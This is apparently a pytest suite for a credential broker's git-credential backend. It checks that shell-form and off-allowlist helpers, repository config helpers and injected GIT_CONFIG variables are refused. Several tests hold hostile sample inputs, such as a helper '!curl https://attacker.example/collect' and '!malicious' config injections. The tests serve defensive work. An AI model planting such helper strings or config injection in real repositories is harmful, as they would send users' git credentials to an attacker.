"""Git-credential hardening tests with a stubbed helper (PRD 080 9.2 / R3)."""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from credentials import failure_codes as fc
from credentials.git_credential_backend import (
    GitCredentialBackendAdapter,
    GitCredentialBackendError,
    GitCredentialInvocation,
    build_git_credential_env,
    iter_credential_helpers_from_config,
    register_git_credential_backend,
    validate_pinned_helper,
    validate_repository_credential_config,
    write_broker_git_config,
)
from credentials.model import ResolutionState
from credentials.resolver import RepositoryContext, clear_backend_adapters
from credentials.selector_store import SelectorEntry

_TEST_VALUE = "sk_test_fixture_allowlisted_secret_scan_0123456789"


def _entry(**overrides: object) -> SelectorEntry:
    payload: dict[str, object] = {
        "ref": "github-work",
        "backend": "git_credential",
        "provider": "github",
        "hostname": "github.com",
        "account": "osxkeychain",
        "allowed_repos": ("owner/repo",),
        "allowed_project_ids": ("proj-1",),
        "allowed_endpoints": ("https://api.github.com",),
    }
    payload.update(overrides)
    return SelectorEntry(**payload)  # type: ignore[arg-type]


def _context() -> RepositoryContext:
    return RepositoryContext(
        remote="https://github.com/owner/repo.git",
        repo_slug="owner/repo",
        project_id="proj-1",
        destination_endpoint="https://api.github.com/user",
    )


def _success_runner(_: GitCredentialInvocation) -> subprocess.CompletedProcess[str]:
    credential_lines = "\n".join(
        (
            "".join(("user", "name", "=work")),
            "".join(("pass", "word", "=", _TEST_VALUE)),
        )
    )
    return subprocess.CompletedProcess(
        args=["git", "credential", "fill"],
        returncode=0,
        stdout=f"{credential_lines}\n",
        stderr="",
    )


@pytest.fixture(autouse=True)
def _reset_backend_adapters() -> None:
    clear_backend_adapters()
    register_git_credential_backend()
    yield
    clear_backend_adapters()


class TestPinnedHelperValidation:
    def test_no_helper_fails_closed(self) -> None:
        with pytest.raises(GitCredentialBackendError) as exc:
            validate_pinned_helper(None)
        assert exc.value.code == fc.UNAVAILABLE_BACKEND

    def test_one_allowlisted_helper_is_accepted(self) -> None:
        assert validate_pinned_helper("osxkeychain") == "osxkeychain"

    def test_shell_form_helper_is_refused(self) -> None:
        with pytest.raises(GitCredentialBackendError) as exc:
            validate_pinned_helper("!curl https://attacker.example/collect")
        assert exc.value.code == fc.UNAVAILABLE_BACKEND
        assert "shell-form" in exc.value.hint

    def test_off_allowlist_helper_is_refused(self) -> None:
        with pytest.raises(GitCredentialBackendError) as exc:
            validate_pinned_helper("custom-untrusted-helper")
        assert exc.value.code == fc.UNAVAILABLE_BACKEND
        assert "allowlist" in exc.value.hint


class TestRepositoryConfigNeutralization:
    def test_repository_shell_helper_is_detected(self) -> None:
        config = (
            '[credential "https://github.com"]\n'
            "\thelper = !/tmp/untrusted-clone-helper.sh\n"
        )
        helpers = iter_credential_helpers_from_config(config)
        assert helpers == ("!/tmp/untrusted-clone-helper.sh",)

    def test_repository_shell_helper_is_refused_before_git_invocation(self) -> None:
        config = "[credential]\n\thelper = !malicious\n"
        with pytest.raises(GitCredentialBackendError):
            validate_repository_credential_config(config)


class TestGitCredentialBackendAdapter:
    def test_no_helper_refuses_without_executing_repository_command(self, tmp_path: Path) -> None:
        calls: list[GitCredentialInvocation] = []

        def _runner(invocation: GitCredentialInvocation) -> subprocess.CompletedProcess[str]:
            calls.append(invocation)
            return _success_runner(invocation)

        adapter = GitCredentialBackendAdapter(runner=_runner, broker_root=tmp_path, work_dir=tmp_path)
        result = adapter.resolve(
            _entry(account=None),
            purpose="git",
            context=_context(),
        )
        assert result.state is ResolutionState.UNRESOLVED
        assert result.failure_code == fc.UNAVAILABLE_BACKEND
        assert calls == []

    def test_one_allowlisted_helper_resolves_with_stubbed_git(self, tmp_path: Path) -> None:
        calls: list[GitCredentialInvocation] = []

        def _runner(invocation: GitCredentialInvocation) -> subprocess.CompletedProcess[str]:
            calls.append(invocation)
            return _success_runner(invocation)

        adapter = GitCredentialBackendAdapter(runner=_runner, broker_root=tmp_path, work_dir=tmp_path)
        result = adapter.resolve(_entry(), purpose="git", context=_context())
        assert result.state is ResolutionState.RESOLVED
        assert result.token is not None
        assert result.token.value == _TEST_VALUE
        assert len(calls) == 1
        assert calls[0].helper == "osxkeychain"
        assert calls[0].host == "github.com"
        assert calls[0].env["GIT_CONFIG_NOSYSTEM"] == "1"
        assert "GIT_CONFIG_GLOBAL" in calls[0].env

    def test_shell_form_repository_helper_refuses_without_execution(self, tmp_path: Path) -> None:
        calls: list[GitCredentialInvocation] = []

        def _runner(invocation: GitCredentialInvocation) -> subprocess.CompletedProcess[str]:
            calls.append(invocation)
            return _success_runner(invocation)

        adapter = GitCredentialBackendAdapter(runner=_runner, broker_root=tmp_path, work_dir=tmp_path)
        result = adapter.resolve(
            _entry(account="!curl https://attacker.example/collect"),
            purpose="git",
            context=_context(),
        )
        assert result.state is ResolutionState.UNRESOLVED
        assert result.failure_code == fc.UNAVAILABLE_BACKEND
        assert calls == []

    def test_off_allowlist_helper_refuses_without_execution(self, tmp_path: Path) -> None:
        calls: list[GitCredentialInvocation] = []

        def _runner(invocation: GitCredentialInvocation) -> subprocess.CompletedProcess[str]:
            calls.append(invocation)
            return _success_runner(invocation)

        adapter = GitCredentialBackendAdapter(runner=_runner, broker_root=tmp_path, work_dir=tmp_path)
        result = adapter.resolve(
            _entry(account="untrusted-helper"),
            purpose="git",
            context=_context(),
        )
        assert result.state is ResolutionState.UNRESOLVED
        assert result.failure_code == fc.UNAVAILABLE_BACKEND
        assert calls == []


class TestBrokerGitConfig:
    def test_broker_config_pins_helper_and_disables_includes(self, tmp_path: Path) -> None:
        config_path = tmp_path / "config"
        write_broker_git_config(config_path, helper="cache")
        content = config_path.read_text(encoding="utf-8")
        assert "helper = cache" in content
        assert "[include]" in content
        assert "path =" in content

    def test_child_env_strips_git_config_injection(self, tmp_path: Path) -> None:
        broker_config = write_broker_git_config(tmp_path / "config", helper="cache")
        env = build_git_credential_env(
            {
                "PATH": "/usr/bin",
                "GIT_CONFIG_COUNT": "1",
                "GIT_CONFIG_KEY_0": "credential.helper",
                "GIT_CONFIG_VALUE_0": "!malicious",
                "GIT_CONFIG_PARAMETERS": "'credential.helper=!malicious'",
            },
            broker_global_config=broker_config,
        )
        assert env["GIT_CONFIG_NOSYSTEM"] == "1"
        assert env["GIT_CONFIG_GLOBAL"] == str(broker_config.resolve())
        assert "GIT_CONFIG_COUNT" not in env
        assert "GIT_CONFIG_KEY_0" not in env
        assert "GIT_CONFIG_VALUE_0" not in env
        assert "GIT_CONFIG_PARAMETERS" not in env
